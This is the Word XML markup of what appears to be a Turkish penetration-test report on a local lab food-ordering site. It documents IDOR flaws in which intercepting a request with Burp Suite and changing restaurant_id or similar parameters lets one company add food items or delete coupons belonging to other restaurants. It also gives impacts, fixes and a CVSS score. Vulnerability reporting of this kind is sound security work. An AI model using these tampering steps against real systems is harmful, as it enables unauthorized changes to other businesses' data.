            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> paremetresinin değeri 6 yapılır. Böylece başarıyla giriş yapan company’inin restorantları dışında başka herhangi bir restoranın kuponu silinir. </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="71C3A220" w14:textId="77777777" w:rsidR="00B43AC4" w:rsidRDefault="00B43AC4" w:rsidP="00C20FA7"/>
          <w:p w14:paraId="792F8934" w14:textId="76D3A32B" w:rsidR="00B43AC4" w:rsidRDefault="00B43AC4" w:rsidP="00C20FA7">
            <w:pPr>
              <w:keepNext/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:drawing>
                <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3027B1BE" wp14:editId="7DDA8915">
                  <wp:extent cx="5713730" cy="6233160"/>
                  <wp:effectExtent l="0" t="0" r="1270" b="0"/>
                  <wp:docPr id="145531121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11213" name=""/>
                          <pic:cNvPicPr/>
                        </pic:nvPicPr>
                        <pic:blipFill>
                          <a:blip r:embed="rId44"/>
                          <a:stretch>
                            <a:fillRect/>
                          </a:stretch>
                        </pic:blipFill>
                        <pic:spPr>
                          <a:xfrm>
                            <a:off x="0" y="0"/>
                            <a:ext cx="5713730" cy="6233160"/>
                          </a:xfrm>
                          <a:prstGeom prst="rect">
                            <a:avLst/>
                          </a:prstGeom>
                        </pic:spPr>
                      </pic:pic>
                    </a:graphicData>
                  </a:graphic>
                </wp:inline>
              </w:drawing>
            </w:r>
          </w:p>
          <w:p w14:paraId="2FAF792B" w14:textId="513890B4" w:rsidR="00B43AC4" w:rsidRPr="005A1CC9" w:rsidRDefault="00B43AC4" w:rsidP="00C20FA7">
            <w:pPr>
              <w:pStyle w:val="ResimYazs"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:color w:val="auto"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="005A1CC9">
              <w:rPr>
                <w:color w:val="auto"/>
              </w:rPr>
              <w:t>Görsel -  1</w:t>
            </w:r>
            <w:r w:rsidR="00F1389F">
              <w:rPr>
                <w:color w:val="auto"/>
              </w:rPr>
              <w:t>4</w:t>
            </w:r>
            <w:r w:rsidRPr="005A1CC9">
              <w:rPr>
                <w:color w:val="auto"/>
              </w:rPr>
              <w:t xml:space="preserve"> Yakalanan İstek</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="79C82209" w14:textId="77777777" w:rsidR="00B43AC4" w:rsidRDefault="00B43AC4" w:rsidP="00C20FA7">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="0DCEB50C" w14:textId="103B3A76" w:rsidR="00B43AC4" w:rsidRDefault="00B43AC4" w:rsidP="00C20FA7">
            <w:pPr>
              <w:keepNext/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B43AC4">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:drawing>
                <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4B3E8B6C" wp14:editId="39777DCF">
                  <wp:extent cx="5713730" cy="3500120"/>
                  <wp:effectExtent l="0" t="0" r="1270" b="5080"/>
                  <wp:docPr id="53958764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87645" name=""/>
                          <pic:cNvPicPr/>
                        </pic:nvPicPr>
                        <pic:blipFill>
                          <a:blip r:embed="rId45"/>
                          <a:stretch>
                            <a:fillRect/>
                          </a:stretch>
                        </pic:blipFill>
                        <pic:spPr>
                          <a:xfrm>
                            <a:off x="0" y="0"/>
                            <a:ext cx="5713730" cy="3500120"/>
                          </a:xfrm>
                          <a:prstGeom prst="rect">
                            <a:avLst/>
                          </a:prstGeom>
                        </pic:spPr>
                      </pic:pic>
                    </a:graphicData>
                  </a:graphic>
                </wp:inline>
              </w:drawing>
            </w:r>
          </w:p>
          <w:p w14:paraId="4E0457EA" w14:textId="5753FB2B" w:rsidR="00B43AC4" w:rsidRPr="00C361DB" w:rsidRDefault="00B43AC4" w:rsidP="00C20FA7">
            <w:pPr>
              <w:pStyle w:val="ResimYazs"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00C361DB">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t xml:space="preserve">Görsel -  </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
            <w:r w:rsidR="009D6A4D">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t>5</w:t>
            </w:r>
            <w:r w:rsidRPr="00C361DB">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t xml:space="preserve"> Dosya Yükleme İsteği</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="17AD7B96" w14:textId="77777777" w:rsidR="00B43AC4" w:rsidRDefault="00B43AC4" w:rsidP="00C20FA7">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="756AD938" w14:textId="77777777" w:rsidR="00B43AC4" w:rsidRPr="00CF0A67" w:rsidRDefault="00B43AC4" w:rsidP="00C20FA7">
            <w:pPr>
              <w:pStyle w:val="ResimYazs"/>
              <w:rPr>
                <w:color w:val="auto"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00B43AC4" w:rsidRPr="00057867" w14:paraId="3965A24E" w14:textId="77777777" w:rsidTr="00C20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17267510" w14:textId="77777777" w:rsidR="00B43AC4" w:rsidRPr="00057867" w:rsidRDefault="00B43AC4" w:rsidP="00C20FA7">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
                <w:highlight w:val="yellow"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>Çözüm Önerisi</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00B43AC4" w:rsidRPr="00D60321" w14:paraId="00D50F99" w14:textId="77777777" w:rsidTr="00C20FA7">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FFFFF" w:themeFill="background1"/>
          </w:tcPr>
          <w:p w14:paraId="0B106CB8" w14:textId="77777777" w:rsidR="00B43AC4" w:rsidRPr="00950946" w:rsidRDefault="00B43AC4" w:rsidP="00B43AC4">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="10"/>
              </w:numPr>
              <w:spacing w:before="240" w:after="160" w:line="360" w:lineRule="auto"/>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00A80369">
              <w:t>Güçlü Doğrulama ve Yetkilendirme Kontrolleri:</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00950946">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>Güvenli bir kullanıcı doğrulama ve yetkilendirme mekanizması oluşturulmalıdır. Kullanıcıların erişebileceği nesneler, etkili kontrollerle doğrulanmalı ve yetkilendirilmelidir.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="10279548" w14:textId="77777777" w:rsidR="00B43AC4" w:rsidRPr="00950946" w:rsidRDefault="00B43AC4" w:rsidP="00B43AC4">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="10"/>
              </w:numPr>
              <w:spacing w:before="240" w:after="160" w:line="360" w:lineRule="auto"/>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00A80369">
              <w:t>Referans Kontrolleri ve Doğrulama:</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00950946">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>Nesnelere erişim sırasında, referanslar arasında etkili doğrulama yapılmalıdır. Bu, kullanıcının erişim izinlerini sürekli olarak kontrol etmek için önemlidir.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="599694BD" w14:textId="77777777" w:rsidR="00B43AC4" w:rsidRPr="00FD2D0C" w:rsidRDefault="00B43AC4" w:rsidP="00B43AC4">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:keepNext/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="10"/>
              </w:numPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00FD2D0C">
              <w:t>Eşsiz Kimlikler ve Doğrulama Kodları:</w:t>
            </w:r>
            <w:r w:rsidRPr="00FD2D0C">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> Güvenli bir referans sistemi oluşturmak adına nesnelere eşsiz kimlikler veya doğrulama kodları eklenmelidir. Bu yöntem, yetkisiz erişimleri önlemeye yardımcı olabilir.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00B43AC4" w14:paraId="66398A00" w14:textId="77777777" w:rsidTr="00C20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bottom w:val="single" w:sz="8" w:space="0" w:color="FFFFFF"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="92D050"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="4F81BD" w:themeFill="accent1"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="08C41A81" w14:textId="77777777" w:rsidR="00B43AC4" w:rsidRDefault="00B43AC4" w:rsidP="00C20FA7">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
              <w:t>Zafiyetin Doğurabileceği Sonuçlar</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00B43AC4" w14:paraId="4B20063C" w14:textId="77777777" w:rsidTr="00C20FA7">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bottom w:val="single" w:sz="8" w:space="0" w:color="FFFFFF"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="92D050"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
          </w:tcPr>
          <w:p w14:paraId="486FFDC0" w14:textId="27B7A0D3" w:rsidR="00B43AC4" w:rsidRPr="00856007" w:rsidRDefault="00B43AC4" w:rsidP="00B43AC4">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="14"/>
              </w:numPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00856007">
              <w:t>Yetkisiz Kupon Ekleme</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> ve Silme</w:t>
            </w:r>
            <w:r w:rsidRPr="00856007">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve">: </w:t>
            </w:r>
            <w:r w:rsidRPr="00856007">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>Bir restoran sahibi, IDOR zafiyeti nedeniyle başka restoranların kuponlarını ekleyebilir. Bu, haksız rekabet yaratabilir veya mali kayıplara neden olabilir.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0B668585" w14:textId="77777777" w:rsidR="00B43AC4" w:rsidRPr="00856007" w:rsidRDefault="00B43AC4" w:rsidP="00B43AC4">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="14"/>
              </w:numPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00856007">
              <w:t>Kuponların Suistimali :</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00856007">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>Bir kullanıcı, başka restoranlar için geçerli olan kuponları kendine veya başkalarına avantaj sağlamak için kullanabilir. Bu durum, gelir kaybına ve müşteri güveninin sarsılmasına neden olur.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="771CFFD4" w14:textId="77777777" w:rsidR="00B43AC4" w:rsidRPr="00856007" w:rsidRDefault="00B43AC4" w:rsidP="00B43AC4">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="14"/>
              </w:numPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00856007">
              <w:t>Gelir Kaybı ve İtibar Zedelenmesi</w:t>
            </w:r>
            <w:r w:rsidRPr="00856007">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>:</w:t>
            </w:r>
            <w:r w:rsidRPr="00856007">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>Kupon sisteminde yapılan yetkisiz değişiklikler, işletmeler için büyük mali kayıplara yol açabilir. Ayrıca, sistemin güvenliğinin sorgulanması itibar kaybına neden olabilir.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2E8F50EB" w14:textId="77777777" w:rsidR="00B43AC4" w:rsidRDefault="00B43AC4" w:rsidP="00B43AC4">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="14"/>
              </w:numPr>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00B43AC4" w:rsidRPr="00402B96" w14:paraId="4CD895A2" w14:textId="77777777" w:rsidTr="00C20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269C14D9" w14:textId="77777777" w:rsidR="00B43AC4" w:rsidRDefault="00B43AC4" w:rsidP="00C20FA7">
            <w:pPr>
              <w:keepNext/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>CVSS</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00B43AC4" w:rsidRPr="00402B96" w14:paraId="627D48F2" w14:textId="77777777" w:rsidTr="00C20FA7">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FFFFF" w:themeFill="background1"/>
          </w:tcPr>
          <w:p w14:paraId="2BF148A9" w14:textId="77777777" w:rsidR="00B43AC4" w:rsidRPr="00C361DB" w:rsidRDefault="00B43AC4" w:rsidP="00C20FA7">
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:t>4.3</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00B43AC4" w:rsidRPr="00402B96" w14:paraId="50D1EEEA" w14:textId="77777777" w:rsidTr="00C20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7B6445AD" w14:textId="77777777" w:rsidR="00B43AC4" w:rsidRPr="00402B96" w:rsidRDefault="00B43AC4" w:rsidP="00C20FA7">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
              <w:t>3</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="20C76498" w14:textId="77777777" w:rsidR="00B43AC4" w:rsidRPr="00593C92" w:rsidRDefault="00B43AC4" w:rsidP="00B43AC4"/>
    <w:p w14:paraId="1C6AF00A" w14:textId="77777777" w:rsidR="00B43AC4" w:rsidRPr="00593C92" w:rsidRDefault="00B43AC4" w:rsidP="00B43AC4"/>
    <w:p w14:paraId="640FC85A" w14:textId="0756C236" w:rsidR="00081BEE" w:rsidRDefault="00081BEE" w:rsidP="00081BEE">
      <w:pPr>
        <w:pStyle w:val="Balk1"/>
      </w:pPr>
      <w:r>
        <w:t>9) IDOR</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="ListeTablo4-Vurgu6"/>
        <w:tblW w:w="9214" w:type="dxa"/>
        <w:tblInd w:w="-34" w:type="dxa"/>
        <w:tblLayout w:type="fixed"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="9214"/>
      </w:tblGrid>
      <w:tr w:rsidR="00081BEE" w14:paraId="4E8ABC86" w14:textId="77777777" w:rsidTr="00C20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left w:val="single" w:sz="4" w:space="0" w:color="FABF8F" w:themeColor="accent6" w:themeTint="99"/>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="FFFFFF"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="92D050"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="4F81BD" w:themeFill="accent1"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4C8612C4" w14:textId="77777777" w:rsidR="00081BEE" w:rsidRDefault="00081BEE" w:rsidP="00C20FA7">
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:t>Zafiyet Adı</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00081BEE" w14:paraId="350DD306" w14:textId="77777777" w:rsidTr="00C20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left w:val="single" w:sz="4" w:space="0" w:color="FABF8F" w:themeColor="accent6" w:themeTint="99"/>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="FFFFFF"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="92D050"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
          </w:tcPr>
          <w:p w14:paraId="3B6F39EB" w14:textId="77777777" w:rsidR="00081BEE" w:rsidRDefault="00081BEE" w:rsidP="00C20FA7">
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:t>IDOR</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00081BEE" w14:paraId="424DC693" w14:textId="77777777" w:rsidTr="00C20FA7">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tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6E65612C" w14:textId="77777777" w:rsidR="00081BEE" w:rsidRDefault="00081BEE" w:rsidP="00C20FA7">
            <w:pPr>
              <w:spacing w:before="240"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00081BEE" w:rsidRPr="00057867" w14:paraId="63AECDFF" w14:textId="77777777" w:rsidTr="00C20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3CC7DD54" w14:textId="77777777" w:rsidR="00081BEE" w:rsidRDefault="00081BEE" w:rsidP="00C20FA7">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
              <w:t>Zafiyet Açıklaması</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5A82B6E1" w14:textId="77777777" w:rsidR="00081BEE" w:rsidRPr="00BF4DE0" w:rsidRDefault="00081BEE" w:rsidP="00C20FA7">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00081BEE" w:rsidRPr="00057867" w14:paraId="4744D2E7" w14:textId="77777777" w:rsidTr="00C20FA7">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FFFFF" w:themeFill="background1"/>
          </w:tcPr>
          <w:p w14:paraId="58B49BAF" w14:textId="554EE6D4" w:rsidR="00081BEE" w:rsidRDefault="00081BEE" w:rsidP="00081BEE">
            <w:pPr>
              <w:jc w:val="both"/>
            </w:pPr>
            <w:hyperlink r:id="rId46" w:history="1">
              <w:r w:rsidRPr="002D6E05">
                <w:rPr>
                  <w:rStyle w:val="Kpr"/>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:t>http://127.0.0.1/login.php</w:t>
              </w:r>
            </w:hyperlink>
            <w:r>
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00EE6B0D">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>adresine gidilir ve</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidR="003220EF">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>şirket</w:t>
            </w:r>
            <w:r w:rsidRPr="00EE6B0D">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> giriş yapılır.</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">  Ardından </w:t>
            </w:r>
            <w:hyperlink r:id="rId47" w:history="1">
              <w:r w:rsidRPr="00135D4C">
                <w:rPr>
                  <w:rStyle w:val="Kpr"/>
                </w:rPr>
                <w:t>http://127.0.0.1/company_foods.php</w:t>
              </w:r>
            </w:hyperlink>
            <w:r>
              <w:t xml:space="preserve">  </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> adresine gidilir.. Listelenen Yemeklerde herhangi bir tanesinin </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Düzenle</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> butonuna tıklanır ve istek burpsuite Proxy aracı ile tutulur</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="23C57BD1" w14:textId="1E57374A" w:rsidR="00081BEE" w:rsidRDefault="00081BEE" w:rsidP="00C20FA7">
            <w:pPr>
              <w:keepNext/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00081BEE">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:drawing>
                <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="12F0E189" wp14:editId="3E08FB78">
                  <wp:extent cx="5713730" cy="6173470"/>
                  <wp:effectExtent l="0" t="0" r="1270" b="0"/>
                  <wp:docPr id="176901675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16755" name=""/>
                          <pic:cNvPicPr/>
                        </pic:nvPicPr>
                        <pic:blipFill>
                          <a:blip r:embed="rId48"/>
                          <a:stretch>
                            <a:fillRect/>
                          </a:stretch>
                        </pic:blipFill>
                        <pic:spPr>
                          <a:xfrm>
                            <a:off x="0" y="0"/>
                            <a:ext cx="5713730" cy="6173470"/>
                          </a:xfrm>
                          <a:prstGeom prst="rect">
                            <a:avLst/>
                          </a:prstGeom>
                        </pic:spPr>
                      </pic:pic>
                    </a:graphicData>
                  </a:graphic>
                </wp:inline>
              </w:drawing>
            </w:r>
          </w:p>
          <w:p w14:paraId="6A2BC256" w14:textId="129E2FE2" w:rsidR="00081BEE" w:rsidRDefault="00081BEE" w:rsidP="00C20FA7">
            <w:pPr>
              <w:pStyle w:val="ResimYazs"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="auto"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="005A1CC9">
              <w:rPr>
                <w:color w:val="auto"/>
              </w:rPr>
              <w:t>Görsel -  1</w:t>
            </w:r>
            <w:r w:rsidR="00FE347C">
              <w:rPr>
                <w:color w:val="auto"/>
              </w:rPr>
              <w:t>6</w:t>
            </w:r>
            <w:r w:rsidRPr="005A1CC9">
              <w:rPr>
                <w:color w:val="auto"/>
              </w:rPr>
              <w:t xml:space="preserve"> Yakalanan İstek</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="21FAC2A4" w14:textId="12B568BE" w:rsidR="00081BEE" w:rsidRPr="00081BEE" w:rsidRDefault="00081BEE" w:rsidP="00081BEE">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve">Yakalanan istekte </w:t>
            </w:r>
            <w:r w:rsidRPr="00081BEE">
              <w:t>Content-Disposition: form-data; name="restaurant_id"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve">parametresinde 1 değeri 2 ile değiştirilir. Böylece başarıyla başka bir restorana yemek ekleme işlemi </w:t>
            </w:r>
            <w:r w:rsidR="003F1C47">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>gerçekleştirilir</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1F9C3909" w14:textId="77777777" w:rsidR="00081BEE" w:rsidRPr="00CF0A67" w:rsidRDefault="00081BEE" w:rsidP="00C20FA7">
            <w:pPr>
              <w:pStyle w:val="ResimYazs"/>
              <w:rPr>
                <w:color w:val="auto"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00081BEE" w:rsidRPr="00057867" w14:paraId="7B5867CC" w14:textId="77777777" w:rsidTr="00C20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365BD072" w14:textId="77777777" w:rsidR="00081BEE" w:rsidRPr="00057867" w:rsidRDefault="00081BEE" w:rsidP="00C20FA7">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
                <w:highlight w:val="yellow"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>Çözüm Önerisi</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00081BEE" w:rsidRPr="00D60321" w14:paraId="63067128" w14:textId="77777777" w:rsidTr="00C20FA7">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FFFFF" w:themeFill="background1"/>
          </w:tcPr>
